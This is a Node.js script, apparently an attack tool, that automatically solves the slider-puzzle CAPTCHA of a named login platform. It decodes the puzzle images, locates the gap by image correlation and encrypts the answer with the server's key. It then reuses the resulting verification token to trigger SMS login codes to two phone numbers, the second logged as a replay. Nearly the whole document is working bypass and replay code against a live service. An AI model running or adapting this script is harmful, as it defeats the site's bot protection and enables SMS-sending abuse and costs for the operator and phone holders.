
import crypto from 'node:crypto';
import zlib from 'node:zlib';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';
const B='https://platform.huimengi.com';
const H={'Content-Type':'application/json','User-Agent':UA,'Origin':B,'Referer':B+'/login/'};
function decodePNG(buf){
  if(buf.readUInt32BE(0)!==0x89504e47) throw new Error('not png');
  let off=8,w=0,h=0,depth=0,ctype=0,idat=[],plte=null;
  while(off<buf.length){const len=buf.readUInt32BE(off),type=buf.toString('ascii',off+4,off+8),data=buf.subarray(off+8,off+8+len);
    if(type==='IHDR'){w=data.readUInt32BE(0);h=data.readUInt32BE(4);depth=data[8];ctype=data[9];}
    else if(type==='IDAT')idat.push(data); else if(type==='PLTE')plte=data; else if(type==='IEND')break;
    off+=12+len;}
  const raw=zlib.inflateSync(Buffer.concat(idat));
  const ch=ctype===6?4:ctype===2?3:ctype===0?1:ctype===3?1:ctype===4?2:null;
  const stride=w*ch,out=Buffer.alloc(w*h*4);let prev=Buffer.alloc(stride),p=0;
  for(let y=0;y<h;y++){const ft=raw[p++];const line=Buffer.from(raw.subarray(p,p+stride));p+=stride;
    for(let i=0;i<stride;i++){const a=i>=ch?line[i-ch]:0,b=prev[i],c=i>=ch?prev[i-ch]:0;let v=line[i];
      if(ft===1)v=(v+a)&255;else if(ft===2)v=(v+b)&255;else if(ft===3)v=(v+((a+b)>>1))&255;
      else if(ft===4){const pp=a+b-c,pa=Math.abs(pp-a),pb=Math.abs(pp-b),pc=Math.abs(pp-c);v=(v+(pa<=pb&&pa<=pc?a:pb<=pc?b:c))&255;}
      line[i]=v;}
    prev=line;
    for(let x=0;x<w;x++){const o=(y*w+x)*4,s=x*ch;
      if(ctype===6){out[o]=line[s];out[o+1]=line[s+1];out[o+2]=line[s+2];out[o+3]=line[s+3];}
      else if(ctype===2){out[o]=line[s];out[o+1]=line[s+1];out[o+2]=line[s+2];out[o+3]=255;}
      else if(ctype===3){const idx=line[s]*3;out[o]=plte[idx];out[o+1]=plte[idx+1];out[o+2]=plte[idx+2];out[o+3]=255;}
      else if(ctype===0){out[o]=out[o+1]=out[o+2]=line[s];out[o+3]=255;}
      else{out[o]=out[o+1]=out[o+2]=line[s];out[o+3]=line[s+1];}}}
  return {w,h,data:out};
}
const aes=(plain,key)=>{const k=Buffer.from(key,'utf8');const c=crypto.createCipheriv(k.length===16?'aes-128-ecb':'aes-256-ecb',k,null);c.setAutoPadding(true);return Buffer.concat([c.update(Buffer.from(plain)),c.final()]).toString('base64');};
async function j(p){const r=await p;const t=await r.text();try{return JSON.parse(t);}catch{return t;}}

function solveNCC(origBuf,jigBuf){
  const O=decodePNG(origBuf), J=decodePNG(jigBuf);
  let x0=1e9,x1=-1,y0=1e9,y1=-1;
  for(let y=0;y<J.h;y++)for(let x=0;x<J.w;x++){ if(J.data[(y*J.w+x)*4+3]>250){if(x<x0)x0=x;if(x>x1)x1=x;if(y<y0)y0=y;if(y>y1)y1=y;} }
  const g=(img,x,y)=>{const o=(y*img.w+x)*4;return img.data[o]*0.299+img.data[o+1]*0.587+img.data[o+2]*0.114;};
  const pts=[];
  for(let y=y0+3;y<=y1-3;y++)for(let x=x0+3;x<=x1-3;x++){
    if(J.data[(y*J.w+x)*4+3]>250) pts.push([x-x0, y-y0, g(J,x,y)]);
  }
  let best=-2,bestX=-1; const scores=[];
  for(let dx=0;dx<=O.w-(x1-x0+1);dx++){
    let sa=0,sb=0,saa=0,sbb=0,sab=0,n=0;
    for(const [px,py,pv] of pts){
      const ov=g(O,dx+px,py); n++; sa+=pv; sb+=ov; saa+=pv*pv; sbb+=ov*ov; sab+=pv*ov;
    }
    const ma=sa/n, mb=sb/n;
    const va=saa/n-ma*ma, vb=sbb/n-mb*mb, cov=sab/n-ma*mb;
    const r=cov/Math.sqrt(Math.max(va,1e-6)*Math.max(vb,1e-6));
    scores.push([dx,r]);
    if(r>best){best=r;bestX=dx;}
  }
  scores.sort((a,b)=>b[1]-a[1]);
  return {x:bestX, ncc:Number(best.toFixed(4)), top:scores.slice(0,4).map(([d,r])=>d+':'+r.toFixed(3))};
}

const uid=crypto.randomUUID();
for(let attempt=1;attempt<=6;attempt++){
  const cap=await j(fetch(B+'/api/auth/captcha/behavior?'+new URLSearchParams({captchaType:'blockPuzzle',clientUid:uid,ts:String(Date.now())}),{headers:H}));
  const d=cap?.data||{};
  const s=solveNCC(Buffer.from(d.originalImageBase64,'base64'),Buffer.from(d.jigsawImageBase64,'base64'));
  const pointJson=aes(JSON.stringify({x:s.x,y:5}),d.secretKey);
  const chk=await j(fetch(B+'/api/auth/captcha/behavior',{method:'POST',headers:H,body:JSON.stringify({captchaType:'blockPuzzle',token:d.token,pointJson,clientUid:uid,ts:Date.now()})}));
  const rep=chk?.data?.repCode;
  console.log('attempt',attempt,'x',s.x,'ncc',s.ncc,'top',s.top.join(' '),'->',rep,chk?.data?.repMsg||'');
  if(rep==='0000'){
    const cv=aes(d.token+'---'+pointJson,d.secretKey);
    const r1=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:H,body:JSON.stringify({phone:'19900000000',scene:'login',captchaVerification:cv})}));
    console.log('sms#1 ->',JSON.stringify(r1));
    const r2=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:H,body:JSON.stringify({phone:'19900000001',scene:'login',captchaVerification:cv})}));
    console.log('sms#2 replay ->',JSON.stringify(r2));
    console.log('captchaVerification =',cv);
    break;
  }
}
